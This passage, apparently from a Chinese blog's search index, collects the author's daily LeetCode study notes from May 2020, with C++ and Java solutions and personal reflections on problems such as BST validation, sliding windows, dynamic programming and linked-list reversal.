亮点在于找到是否循环\n我们知道会有以下三种可能。\n\n最终会得到 11。\n最终会进入循环。\n值会越来越大，最后接近无穷大。\n\n最后一种不会出现，因为 在全部拆解平方和之后，会把数字下降。\n所以就是看循环啦。怎么判断进入循环呢？\n利用快慢指针！！快的比慢的每次多走一步。\n记住反正如果是1的话，最后快指针会停下来。慢指针会追上来。\n而循环的话，快指针总会追上慢指针的，只是时间的问题而已。\n这里的环是数值的环形链。\nclass Solution &#123;public:    //得到各个数平方和    int getNext(int n)&#123;        int sum = 0;        while(n)&#123;            int t = n%10;            t*=t;            sum+=t;            n=n/10;        &#125;        return sum;     &#125;\t    bool isHappy(int n) &#123;        int slow = n;        int fast = n;        //开始移动        do&#123;            slow = getNext(slow);            fast = getNext(getNext(fast));        &#125;while(slow != fast);        return slow == 1;    &#125;&#125;;\n\n","categories":["leetcode——每日一题"]},{"title":"leetcode_02_part","url":"/2020/05/01/Leetcode_%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/leetcode-02-part/","content":"前言难顶，又到五月了。这几天要忙着数学建模。\n但是leeetcode还是要接着写呀！\n\n\n2020.05.0121. 合并两个有序链表将两个升序链表合并为一个新的升序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 \n示例：\n输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4\n\n解析：\n这道题是真的简单。初级算法做过类似的题目。\n所以我很感谢当初自己坚持做完了初级算法。确实让我见过了大多数的题目。\n很明显，两个链表合并。那么我们可以用双指针呀。\n直接双指针搞定！核心的代码很简单 ，看下面代码就懂了。\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123;        //注意到这里我们要判断是否为空        if(l1==NULL||l2==NULL)&#123;            return l1==NULL?l2:l1;        &#125;        //保证头节点，到时候返回头节点        //利用p节点让后续迭代        ListNode *head , *p ;        //获得头节点        if(l1-&gt;val &lt; l2-&gt;val)&#123;            head = l1;            l1 = l1-&gt;next;        &#125;else&#123;            head = l2;            l2 = l2-&gt;next;        &#125;        p = head;        //直到其中一个为空指针        while(l1!=NULL &amp;&amp; l2!=NULL)&#123;            if(l1-&gt;val &lt; l2-&gt;val)&#123;                p-&gt;next = l1;                l1 = l1-&gt;next;                p = p-&gt;next;            &#125;            else&#123;                p-&gt;next = l2;                l2 = l2-&gt;next;                p = p-&gt;next;            &#125;        &#125;        //到时候如果有不是空的就直接处理        if(l1!=NULL)&#123;            p-&gt;next=l1;        &#125;else&#123;            p-&gt;next=l2;        &#125;        return head;    &#125;&#125;;\n\n2020.05.023. 无重复字符的最长子串给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。\n示例 1:\n输入: “abcabcbb”输出: 3解释: 因为无重复字符的最长子串是 “abc”，所以其长度为 3。示例 2:\n输入: “bbbbb”输出: 1解释: 因为无重复字符的最长子串是 “b”，所以其长度为 1。示例 3:\n输入: “pwwkew”输出: 3解释: 因为无重复字符的最长子串是 “wke”，所以其长度为 3。     请注意，你的答案必须是 子串 的长度，”pwke” 是一个子序列，不是子串。\n\n这道题目 也是一道动态规划题目，更加重要的是一道滑动窗口题目。\n看到它是子串，不是子序列！！\n很有趣的滑动窗口题目！\n怎么想呢？——我们需要看到的是子串\n那么我们用类似滑动窗口的视角来滑动。这样我们需要有几个步骤\n判断字符重复\n先移动右边界限，如果出现重复字符 那么再移动左边。\n每一次准备移动左边都说明 这次子串结束 计算其长度！\nclass Solution &#123;public:    int lengthOfLongestSubstring(string s) &#123;        set&lt;char&gt; st;        //这里我们使用集合来判断是否出现相同字符        int n = s.size();        //确定开头为-1  这里是未来后面rk+1 做准备        //为了 0 &lt; 1  -1 + 1 =0 &lt; 1        int rk = -1;        int ans = 0;        //左边开始增加        for(int i=0;i&lt;n;i++)&#123;            if(i!=0)&#123;                st.erase(s[i-1]);            &#125;            //判断 下一个是不是重复了  存在是1  非 则是0  意思就是为重复 直接脱离循环            while(rk+1&lt;n&amp;&amp; ! st.count(s[rk+1]))&#123;                st.insert(s[rk+1]);                rk++;            &#125;            ans = max(ans,rk-i+1);        &#125;        return ans;    &#125;&#125;;\n\n2020.05.0353. 最大子序和给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。\n示例:\n输入: [-2,1,-3,4,-1,2,1,-5,4],输出: 6解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。\n今天题目，一眼就看的出标准的动态规划\n那么动态规划题目一般怎么写呢？【得查查\n动态规划类问题常规的解决方法是：\n\n问题拆解，找到问题的定义\n状态定义\n递归方程求解\n实现\n\n我们看这道题目，分析情况，自底向上\n。。【我不知道怎么说啊。。。\n直接看代码吧\nclass Solution &#123;public:    int maxSubArray(vector&lt;int&gt;&amp; nums) &#123;        if(nums.size()==0)            return 0;        vector&lt;int&gt; dp;        dp.push_back(nums[0]);        for(int i=1;i&lt;nums.size();i++)&#123;            dp.push_back(max(dp[i-1]+nums[i],nums[i]));        &#125;        sort(dp.begin(), dp.end());        return dp[nums.size()-1];    &#125;&#125;;\n\n2020.05.0598. 验证二叉搜索树给定一个二叉树，判断其是否是一个有效的二叉搜索树。\n假设一个二叉搜索树具有如下特征：\n节点的左子树只包含小于当前节点的数。节点的右子树只包含大于当前节点的数。所有左子树和右子树自身必须也是二叉搜索树。示例 1:\n输入:    2   &#x2F;   1   3输出: true示例 2:\n输入:    5   &#x2F;   1   4     &#x2F;     3   6输出: false解释: 输入为: [5,1,4,null,null,3,6]。     根节点的值为 5 ，但是其右子节点值为 4 。\n\n记住二叉搜索树有什么特点\n节点的左子树只包含小于当前节点的数。节点的右子树只包含大于当前节点的数。【注意没有等于\n两种方法： \n递归法思路：\n我们要知道 对于一个二叉搜索树，任何一个节点，它的左子树小于其，它的右子树大于其。\n也就是说，我们可以这么认为，root节点是左子树的上界，是其右子树的下界。\n那么我们只要遍历整颗树，判断他是否满足这个性质就可以了。\n理一下递归方程：\n这个递归函数的作用： 判断这个值是否目前节点是否在其区间内，是的话返回true\n递归出口：如果root为空，返回true\nclass Solution &#123;public:    bool isValidBST(TreeNode* root) &#123;        //这里需要我们拿取最小最大值，不要用int        //int的范围会小了一点        return isBST(root,LLONG_MIN,LLONG_MAX);    &#125;    //这里函数  我们也要用long long    bool isBST(TreeNode* root,long long min,long long max)&#123;        if(root == NULL)//到了根节点            return true;        if(root-&gt;val&lt;=min || root-&gt;val &gt;=max)//这个值不在范围内            return false;        return isBST(root-&gt;left,min,root-&gt;val)&amp;&amp;isBST(root-&gt;right,root-&gt;val,max);    &#125;&#125;;\n\n中序遍历我们知道，对于二叉搜索树，其中序遍历得到的值是递增的\n那么，我们只需要获取中序遍历值，然后判断递增不就好了√\n那么最笨的方法就是先获取中序遍历数组，再判断是否有序。\n但是还有更好的——变遍历边判断！\n看代码！\nclass Solution &#123;public:    long long pre = LLONG_MIN;    bool isValidBST(TreeNode* root) &#123;        //该递归方程的作用：可以判断本树是否为二叉搜索树        //如果我是空的 返回真        if(root == NULL)            return true;        //根据中序遍历        //我们从左子树开始判断是否为二叉搜索树        if(!isValidBST(root-&gt;left))            return false;        //左 根 右  现在判断根的情况        if(root-&gt;val  &lt;= pre)            return false;        //给pre——前面一个值 进行更新        pre = root-&gt;val;        //现在是右子树        return isValidBST(root-&gt;right);    &#125;&#125;;\n\n很难，说实话，我觉得我不够透彻。周末再写一遍这道题目吧\n2020.05.06983. 最低票价在一个火车旅行很受欢迎的国度，你提前一年计划了一些火车旅行。在接下来的一年里，你要旅行的日子将以一个名为 days 的数组给出。每一项是一个从 1 到 365 的整数。\n火车票有三种不同的销售方式：\n一张为期一天的通行证售价为 costs[0] 美元；一张为期七天的通行证售价为 costs[1] 美元；一张为期三十天的通行证售价为 costs[2] 美元。通行证允许数天无限制的旅行。 例如，如果我们在第 2 天获得一张为期 7 天的通行证，那么我们可以连着旅行 7 天：第 2 天、第 3 天、第 4 天、第 5 天、第 6 天、第 7 天和第 8 天。\n返回你想要完成在给定的列表 days 中列出的每一天的旅行所需要的最低消费。\n示例 1：\n输入：days &#x3D; [1,4,6,7,8,20], costs &#x3D; [2,7,15]输出：11解释：例如，这里有一种购买通行证的方法，可以让你完成你的旅行计划：在第 1 天，你花了 costs[0] &#x3D; $2 买了一张为期 1 天的通行证，它将在第 1 天生效。在第 3 天，你花了 costs[1] &#x3D; $7 买了一张为期 7 天的通行证，它将在第 3, 4, …, 9 天生效。在第 20 天，你花了 costs[0] &#x3D; $2 买了一张为期 1 天的通行证，它将在第 20 天生效。你总共花了 $11，并完成了你计划的每一天旅行。示例 2：\n输入：days &#x3D; [1,2,3,4,5,6,7,8,9,10,30,31], costs &#x3D; [2,7,15]输出：17解释：例如，这里有一种购买通行证的方法，可以让你完成你的旅行计划：在第 1 天，你花了 costs[2] &#x3D; $15 买了一张为期 30 天的通行证，它将在第 1, 2, …, 30 天生效。在第 31 天，你花了 costs[0] &#x3D; $2 买了一张为期 1 天的通行证，它将在第 31 天生效。你总共花了 $17，并完成了你计划的每一天旅行。\n提示：\n1 &lt;&#x3D; days.length &lt;&#x3D; 3651 &lt;&#x3D; days[i] &lt;&#x3D; 365days 按顺序严格递增costs.length &#x3D;&#x3D; 31 &lt;&#x3D; costs[i] &lt;&#x3D; 1000\n\n这道题目，直接说我不会做，看人家题目解析，看了好久才明白。\n但是又不能说很懂。\n我们在自己旅行上花的价钱最少，\n三种情况\n在本日买了一天的票，至此花费的总价格\n在七天前买了七天的票，到现在花费的总价钱\n在三十天之前买了三十天的票，到现在花费的总价格\n然后决定最小值当作我此刻的最好的买票方式\n然后代码就出来了\nclass Solution &#123;public:    int mincostTickets(vector&lt;int&gt;&amp; days, vector&lt;int&gt;&amp; costs) &#123;        if(days.size()==0 || costs.size() == 0)&#123;            return 0;        &#125;        vector&lt;int&gt; dp(days[days.size()-1]+1);        //给不旅游的时间赋予 0  给旅游的时间赋予max        for(int i=0;i&lt;days.size();i++)&#123;            dp[days[i]] = INT_MAX;        &#125;        //书写dp数组        for(int i=1;i&lt;dp.size();i++)&#123;            if(dp[i]==0)&#123;                dp[i]=dp[i-1];                continue;            &#125;            /*            一开始我很疑惑，如果我那天就已经买了七天的票            那么在我计算dp[i]的时候，又写dp[i-7]+cost[2]不是多买了一次吗            但是仔细看这个dp方程  在前面的dp数组中，只可能自己买了1天，或者前辈买了7天            【对于小于7 小于30 的情况另外算            【小于7 小于 30 的时候，因为最小化的缘故，可以【我也不知道。。            */            int n1 = dp[i-1] + costs[0];            int n2 = i&gt;7?dp[i-7]+costs[1]:costs[1];            int n3 = i&gt;30?dp[i-30]+costs[2]:costs[2];            dp[i] = min(min(n1,n2),n3);        &#125;        return dp[dp.size()-1];    &#125;&#125;;\n\n\n\n2020.05.07572. 另一个树的子树给定两个非空二叉树 s 和 t，检验 s 中是否包含和 t 具有相同结构和节点值的子树。s 的一个子树包括 s 的一个节点和这个节点的所有子孙。s 也可以看做它自身的一棵子树。\n示例 1:给定的树 s:\n 3\n/ \\\n\n   4   5  &#x2F;  1   2给定的树 t：\n   4  &#x2F;  1   2返回 true，因为 t 与 s 的一个子树拥有相同的结构和节点值。\n示例 2:给定的树 s：\n 3\n/ \\\n\n   4   5  &#x2F;  1   2    &#x2F;   0给定的树 t：\n   4  &#x2F;  1   2返回 false。\n\n分析：\n简单题，但是可以不简单的来写。题解有三种方法\n暴力破解\t\t利用前序遍历\t利用树哈希\n首先暴力破解说说【其他不说了，kmp手写我傻了\n我们利用对主树的每一个节点遍历是否和目标树是相同的\n【讲真我听起来就觉得它的时间复杂度很高。所以我就直接否定了暴力破解\n【结果爆破还真行。。\n理一下我们对于爆破的思路\n1、遍历主树\n2、对每个主树的节点当作数根节点和目标树比较——也就是比较树相等\n那么再分别看看这两个步骤\n遍历主树——\n首先看本节点是否相等 如果相等那么进入树相等判断\n之后判断本节点的左节点和右节点\n检查树相等——\n该节点是否相等\n该节点的左节点是否相等\n该节点的右节点是否相等\n​\t递归出口 都为空返回true\n那么代码如下：\nclass Solution &#123;public:    /*    暴力破解做法：    循环试探每一个节点作为根节点是否和目标树相同     那么我们循环每一个s树的节点试探    每一个节点都和目标子树进行判断    两个函数  一个递归本树  一个判断相同    */    bool check(TreeNode*s1,TreeNode *t1)&#123;        /**        如何判断相同呢？        递归：            1、本节点是不是相同             2、左子树是不是相同            3、右子树是不是相同        递归出口： 如果为两节点值为空，贼退出        */        //这个是递归出口        if(s1==nullptr &amp;&amp; t1==nullptr)            return true;        //如果出现有一个为空 就不可能指向数值        if(s1==nullptr || t1 == nullptr || (s1-&gt;val != t1-&gt;val))            return false;        return check(s1-&gt;right,t1-&gt;right) &amp;&amp; check(s1-&gt;left,t1-&gt;left);    &#125;    bool dfs(TreeNode* ss,TreeNode* tt)&#123;        //因为我们后面会递归主树的各个节点        //那么某个节点的左右节点是空节点 就不存在左右节点了        //所以当进来的ss节点是空节点的时候，直接返回false        if(ss==nullptr)            return false;        return check(ss,tt) || dfs(ss-&gt;left,tt) || dfs(ss-&gt;right,tt);    &#125;        bool isSubtree(TreeNode* s, TreeNode* t) &#123;        return dfs(s,t);    &#125;&#125;;\n\n一个小tips、如果存在指向左右节点的操作\n一定要判断是否本节点为空。如果为空，就不可以进行指向左右节点的操作\n这会出现越界的问题。\n分析一下时间复杂度：\ns树每一个节点都需要访问一次——\n树相等操作时，最大的是 t树的每一个节点都访问一次——\n那么 时间复杂度大概是O(|s|*|t|)\n空间复杂度\n递归算法空间复杂度：递归深度n*每次递归所要的辅助空间，如果每次递归所需要的辅助空间为常数，则递归空间复杂度o（n）。\n那么 看遍历主树的空间复杂度为 s树的深度\n树相同递归中的空间复杂度为t树的深度\n两个递归的最大的空间消耗 就是这个程序的空间复杂度 即O(max{ s, t})\n","categories":["leetcode——每日一题"]},{"title":"leetcode_03","url":"/2020/05/08/Leetcode_%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/leetcode-03/","content":"2020.05.08221. 最大正方形在一个由 0 和 1 组成的二维矩阵内，找到只包含 1 的最大正方形，并返回其面积。\n\n\n示例:\n输入: 1 0 1 0 01 0 1 1 11 1 1 1 11 0 0 1 0输出: 4\n\n\n又是看题解看的懂，自己就是写不出。。\n好吧，唔，服气。\n爆破是可以的，但是懒得看。\n直接dp解决吧。emmm，具体思想我觉得关键在动态规划方程\n直接看代码吧\nclass Solution &#123;public:    int maximalSquare(vector&lt;vector&lt;char&gt;&gt;&amp; matrix) &#123;        /*            动态规划            规划方程 上 左 左上最小值加一            首先 我们dp数组 保存正方形右下角在我这里的宽长            然后 递归原来的数组        */        //利用||运算的短路规则        if(matrix.size() == 0 || matrix[0].size() == 0)            return 0;        int row = matrix.size();        //当这个vector是空的时候，就不能访问matrix[0] 这会溢出的        int col = matrix[0].size();        //return col;        int maxsize = 0;        //这里的初始化很经典        vector&lt;vector&lt;int&gt;&gt; dp(row,vector&lt;int&gt;(col));        for(int i=0;i&lt;row;i++)&#123;            for(int j = 0;j&lt;col;j++)&#123;                //遇到1   这里是字符 不是数字                if(matrix[i][j]==&#x27;1&#x27;)&#123;                    //确保等于1                    if(i==0 || j==0)                        dp[i][j]=1;                    else&#123;                        //dp方程  取左边 上边 左上最小＋1                        dp[i][j]=min(min(dp[i-1][j],dp[i-1][j-1]),dp[i][j-1])+1;                    &#125;                &#125;                maxsize = max(maxsize,dp[i][j]);            &#125;        &#125;        return maxsize*maxsize;    &#125;&#125;;\n\n2020.05.09今天的题目太简单了。。没什么意思就不写在这里\n——就是手写平方根\n2020.05.10236. 二叉树的最近公共祖先给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。\n百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”\n例如，给定如下二叉树:  root &#x3D; [3,5,1,6,2,0,8,null,null,7,4]\n\n示例 1:\n输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 1输出: 3解释: 节点 5 和节点 1 的最近公共祖先是节点 3。示例 2:\n输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 4输出: 5解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。\n\n今天的题目 有意思\n有两种解法。但是不是很想写，就写写第一种吧\n递归处理首先 我们这个函数的功能是：找到在此根节点下的父节点\n那么就有几种情况出现\n1、此根节点为某一个值——最大父节点为这个\n2、此根节点为空——返回空\n3、获取左右节点 如果左右节点都是空 说明左子树右子树都没有我们的那两个值\n4、左右节点某一支为空，某一支不为空。为空说明该子数没有发现它\n5、最后 两个子树都不为空 那么返回本根节点 \n/** * Definition for a binary tree node. * struct TreeNode &#123; *     int val; *     TreeNode *left; *     TreeNode *right; *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) &#123;        /*        首先 如果本节点是其中之一，则直接返回该节点为父亲        否则 到左右节点 如果 左右节点得到的值不是空 那么表示左右节点都有一个值        那么返回本节点        如果只有左节点，那么说明左节点里有父亲        */        if(root == NULL)&#123;            return NULL;        &#125;        if(root == q || root == p)&#123;            return root;        &#125;        TreeNode * left1 = lowestCommonAncestor(root-&gt;left,p,q);        TreeNode * right1 = lowestCommonAncestor(root-&gt;right,p,q);        if(left1==NULL &amp;&amp; right1 == NULL)&#123;            return NULL;        &#125;        if(left1 == NULL)            return right1;        if(right1 == NULL)            return left1;        return root;    &#125;&#125;;\n\n2020.05.1150. Pow(x, n)实现 pow(x, n) ，即计算 x 的 n 次幂函数。\n示例 1:\n输入: 2.00000, 10输出: 1024.00000示例 2:\n输入: 2.10000, 3输出: 9.26100示例 3:\n输入: 2.00000, -2输出: 0.25000解释: 2-2 &#x3D; 1&#x2F;22 &#x3D; 1&#x2F;4 &#x3D; 0.25说明:\n-100.0 &lt; x &lt; 100.0n 是 32 位有符号整数，其数值范围是 [−231, 231 − 1] 。\n\n这道题目 核心就是快速幂\n相当于从5的56次方——我们求5的28次方——求5的14次方——求5的7次方——求5的3次方——求5的1次方——求5的0次方。\n只需要7次就可以得到值。\n但是注意到，在我们除二的时候，需要判断此时的幂是否为偶数。、\n那么直接代码出来看看\nclass Solution &#123;public:    double myPow(double x, int n) &#123;        if(n == 0)            return 1;        return solve(x,(long long)n);    &#125;    // 到了int最小值 我们要求-1*原值 那会越界溢出   所以需要提高空间     double solve(double x,long long n)&#123;        //递归到头返回        if(n==0)            return 1;        //此处确保稳定的正值        bool right = true;        if(n&lt;0)&#123;            right = false;            n=-1*n;        &#125;        //得到返回值  递归的次数就是递归深度        double temp = solve(x,n/2);        //根据偶数与否确定是否要乘x        double res = n%2==0?temp*temp:temp*temp*x;        //最终结果        if(right)            return res;        else            return 1.0/res;    &#125;&#125;;\n\n2020.05.13102. 二叉树的层序遍历给你一个二叉树，请你返回其按 层序遍历 得到的节点值。 （即逐层地，从左到右访问所有节点）。\n示例：二叉树：[3,9,20,null,null,15,7],\n​\t3\n   &#x2F;   9  20    &#x2F;     15   7返回其层次遍历结果：\n[  [3],  [9,20],  [15,7]]\n\n解析——标准地BFS遍历\n常见地BFS一般是使用队列来实现\n我觉得看代码就懂了！\n/** * Definition for a binary tree node. * struct TreeNode &#123; *     int val; *     TreeNode *left; *     TreeNode *right; *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) &#123;        //目标结果        vector&lt;vector&lt;int&gt;&gt; ves;        queue&lt;TreeNode*&gt; que;        //特殊情况        if(root == NULL)            return ves;        //开始嵌入        que.push(root);        //根源        while(!que.empty())&#123;            vector&lt;int&gt; cenves;            int length = que.size();            //核心 注意for循环里一定是length 不能直接写que.size()            for(int i=0;i&lt;length;i++)&#123;                TreeNode * node = que.front();                que.pop();                cenves.push_back(node-&gt;val);                //从左到右                if(node-&gt;left!=NULL)&#123;                    que.push(node-&gt;left);                &#125;                if(node-&gt;right!=NULL)&#123;                    que.push(node-&gt;right);                &#125;            &#125;            ves.push_back(cenves);        &#125;        return ves;    &#125;&#125;;\n\n2020.05.14136. 只出现一次的数字给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。\n说明：\n你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？\n示例 1:\n输入: [2,2,1]输出: 1示例 2:\n输入: [4,1,2,1,2]输出: 4\n\n很像是前面做过的那道题——数组中数字出现的次数\n所以很容易想到异或\n说明下异或的操作\n任何数字和0异或都为原来的值\n相同数字异或为0\n那么直接可以写出代码了\n【再想想还有什么方法：利用map也可以不过需要空间还要时间。\n代码如下\nclass Solution &#123;public:    int singleNumber(vector&lt;int&gt;&amp; nums) &#123;        int res = 0;        //遍历        for(int i=0;i&lt;nums.size();i++)&#123;            res=res^nums[i];        &#125;        return res;    &#125;&#125;;\n\n时间复杂度：遍历了一遍数组 故而 O(n)\n空间复杂度：没有额外的空间 故而O(1)\n2020.05.15560. 和为K的子数组给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。\n示例 1 :\n输入:nums &#x3D; [1,1,1], k &#x3D; 2输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。说明 :\n数组的长度为 [1, 20,000]。数组中元素的范围是 [-1000, 1000] ，且整数 k 的范围是 [-1e7, 1e7]。\n\n这道题目是有正数有负数。\n本来我一开始想的是利用前缀和+尺取法搞定\n想一想 一开始觉得很对结果…\nnums  &#x3D;   1\t1\t1\t-1\t2\t这里的k&#x3D;2\n如果按照尺取法，那么在nums[2]的时候 大于2，这个时候l就要加一\n那么就不会出现 我们的数组为[1\t1\t1\t-1]  = 2这种情况啦\n所以尺取法行不通。看了下 尺取法一般用来解决具有单调性的区间问题\n下面说说正规的方法：\n暴力i\tj嘛。我们直接循环查找。\n首先最外层i循环 内部 j循环 如果&#x3D;&#x3D;k，那么就count++\n那么代码就有了\nclass Solution &#123;public:    int subarraySum(vector&lt;int&gt;&amp; nums, int k) &#123;        int count = 0;        /*        从 i 出发   载到j        如果i-j只和为k 则 count++        */        int size = nums.size();        for(int i=0;i&lt;size;i++)&#123;            int sum =0;            for(int j=i;j&lt;size;j++)&#123;                sum += nums[j];                if(sum == k)&#123;                    count++;                &#125;            &#125;        &#125;        return count;    &#125;&#125;;\n\n这样极度容易超时。\n反省了一下，以后用int size = nums.size()\n这样可以节省时间，更加有效。\n前缀和+哈希表优化这个的思路是什么呢？\n​    利用前缀和+map\n​    前缀和在遍历的时候+\n​    因为 sum[j] - sum[i-1] &#x3D;&#x3D; k 说明 j-i满足和为k的数组\n​    那么在遍历前缀和的时候， 如果 sum[j] - k 存在这个数字\n​    那么我们加上这个数字出现的次数 在这个区间内 有\n​    但是记住 我们是统计 在j这个之前的是否存在 sum[j]-k！ \nclass Solution &#123;public:    int subarraySum(vector&lt;int&gt;&amp; nums, int k) &#123;        /*        利用前缀和+map        前缀和在遍历的时候+        因为 sum[j] - sum[i-1] == k 说明 j-i满足和为k的数组        那么在遍历前缀和的时候， 如果 sum[j] - k 存在这个数字        那么我们加上这个数字出现的次数 在这个区间内 有        但是记住 我们是统计 在j这个之前的是否存在 sum[j]-k！         */        map&lt;int,int&gt; mp;  //我们的map        mp[0]=1;        int count = 0;        int pre = 0;        for(int i:nums)&#123;            pre += i;//统计前缀和            if(mp.count(pre - k))&#123;                //加上 在此之前的                count += mp[(pre-k)];            &#125;            // 记录下这个数字出现次数            mp[pre]++;        &#125;        return count;    &#125;&#125;;\n\n我打算之后写写Java的题解，相当于练习java了\nclass Solution &#123;    public int subarraySum(int[] nums, int k) &#123;        int pre = 0;        int count = 0;        //HashMap 调出来        HashMap&lt;Integer,Integer&gt; mp = new HashMap&lt;&gt;();        mp.put(0,1);//put方法放进去        for(int i:nums)&#123;            pre+=i;            //确定是否包含            if(mp.containsKey(pre - k))&#123;                count+=mp.get(pre - k);            &#125;            //getOrDefault 拿值或者默认值  这里是Integer            mp.put(pre,mp.getOrDefault(pre, 0)+1);        &#125;        return count;    &#125;&#125;\n\n2020.05.1625. K 个一组翻转链表给你一个链表，每 k 个节点一组进行翻转，请你返回翻转后的链表。\nk 是一个正整数，它的值小于或等于链表的长度。\n如果节点总数不是 k 的整数倍，那么请将最后剩余的节点保持原有顺序。\n示例：\n给你这个链表：1-&gt;2-&gt;3-&gt;4-&gt;5\n当 k &#x3D; 2 时，应当返回: 2-&gt;1-&gt;4-&gt;3-&gt;5\n当 k &#x3D; 3 时，应当返回: 3-&gt;2-&gt;1-&gt;4-&gt;5\n说明：\n你的算法只能使用常数的额外空间。你不能只是单纯的改变节点内部的值，而是需要实际进行节点交换。\n\n首先 这题反转链表很简单，但是后面就好难好难\n我觉得这道题目 题解解释的很清楚，但是记录下一些很好的东西。\n\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* reverseKGroup(ListNode* head, int k) &#123;        //把哨兵节点写出来        ListNode * bhead = new ListNode(0);        bhead-&gt;next = head;        ListNode * pre = bhead;        //前期阶段 哨兵节点处理完毕 进入循环        while(head)&#123;            ListNode * tail = pre;            for(int i=0;i&lt;k;i++)&#123;                tail = tail-&gt;next;                if(tail == NULL)                    return bhead-&gt;next;            &#125;            //得到K个一组的最后一个节点            //记录写一个节点            ListNode * tail_nex = tail-&gt;next;            tie(head,tail) = rev(head,tail);            //处理反转之后两个端点的节点指向            pre-&gt;next = head;            tail-&gt;next=tail_nex;            //给后续的循环            head=tail_nex;            pre=tail;        &#125;        return bhead-&gt;next;    &#125;        pair&lt;ListNode* ,ListNode* &gt; rev(ListNode* head,ListNode* tail)&#123;        ListNode * pre = NULL;        ListNode* cul = head;        while(pre != tail)&#123;            ListNode* temp = cul-&gt;next;                       cul-&gt;next = pre;            pre = cul;            cul = temp;            //如果 前面 cul = value temp = NULL;            //那么这里又有 NULL-&gt;next;  就会空指针异常            //temp = temp-&gt;next;            //考虑特殊情况指针异常 往最前面 最后面套进去看看        &#125;        return &#123;tail,head&#125;;    &#125;&#125;;\n\n说实话，我不知道怎么总结这道题目。。 就很无奈。【哎\n","categories":["leetcode——每日一题"]},{"title":"leetcode_04","url":"/2020/05/18/Leetcode_%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/leetcode-04/","content":"前言21天打卡任务 开始了\n\n\n2020.05.18152. 乘积最大子数组给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。\n示例 1:\n输入: [2,3,-2,4]输出: 6解释: 子数组 [2,3] 有最大乘积 6。示例 2:\n输入: [-2,0,-1]输出: 0解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。\n\n强势暴力破解class Solution &#123;public:    int maxProduct(vector&lt;int&gt;&amp; nums) &#123;                int ans = 1;        int max_res = INT_MIN;        for(int i=0;i&lt;nums.size();i++)&#123;            for(int j = i;j&lt;nums.size();j++)&#123;                ans*=nums[j];                max_res = max(ans,max_res);            &#125;            ans = 1;        &#125;        return max_res;    &#125;&#125;;\n\n很不幸，超时了。。\n动态规划这个 需要求出动态规划方程\n\nclass Solution &#123;public:    int maxProduct(vector&lt;int&gt;&amp; nums) &#123;        int max_F = nums[0];        int min_F = nums[0];        int ans = max_F;        for(int i = 1;i&lt;nums.size();i++)&#123;            //需要提前记录下来 max_F,min_F            //不然 在求解min_F的时候会出现 不同时更新的现象            int F_max = max_F;            int F_min = min_F;            //这里 我们利用max_F 记录下每一个到此为止最大乘积            max_F = max(max(F_max*nums[i],F_min*nums[i]),nums[i]);            //这里记录下一个到此为止乘积最小值            min_F = min(min(F_min*nums[i],F_max*nums[i]),nums[i]);            ans = max(max_F,ans);        &#125;        return ans;    &#125;&#125;;\n\n这个题目时间复杂度极度好！！！\n时间O(n)\t\t空间O(1)\n2020.05.19680. 验证回文字符串 Ⅱ给定一个非空字符串 s，最多删除一个字符。判断是否能成为回文字符串。\n示例 1:\n输入: “aba”输出: True示例 2:\n输入: “abca”输出: True解释: 你可以删除c字符。\n\n这道题目 其实考点容易的\n回文串 那么双指针查找就好了\n但是如何判断去除一个字符之后还是回文串呢？\n我一开始的想法是\n如果 i\tj 两个指针的字符不一致，那么判断去除哪个字符\n如何判断\t 假设 i+1和 j字符相同  那么去除 i字符\n假设 i 和 j+1字符相同\t那么去除j字符\n如果上述都不成立 直接返回false。\n但是出现了一个很尴尬的情况\ncuppucu: 我们看的出来去除u字符，但是 按照判断逻辑\nc+1 &#x3D; u字符和 j的u字符相等 所以应该去除c字符。\n这个时候我就有点难受了。。。。\n下面是正确思路：\n去除一个字符后 剩下的就应该是回文串 如果不是 那么就直接返回false\n代码很好写\nclass Solution &#123;public:    bool validPalindrome(string s) &#123;                for(int i = 0, j = s.size()-1;i&lt;j;i++,j--)&#123;            if(s[i]!=s[j])&#123;                bool res1=true,res2=true;                for(int start = i+1,end =j;start&lt;end;start++,end--)&#123;                    if(s[start]!=s[end])                        res1 = false;                &#125;                                for(int start = i,end =j-1;start&lt;end;start++,end--)&#123;                    if(s[start]!=s[end])                        res2 = false;                &#125;                if(res1||res2)                    return true;                else                    return false;            &#125;        &#125;        return true;    &#125;&#125;;\n\n2020.05.22105. 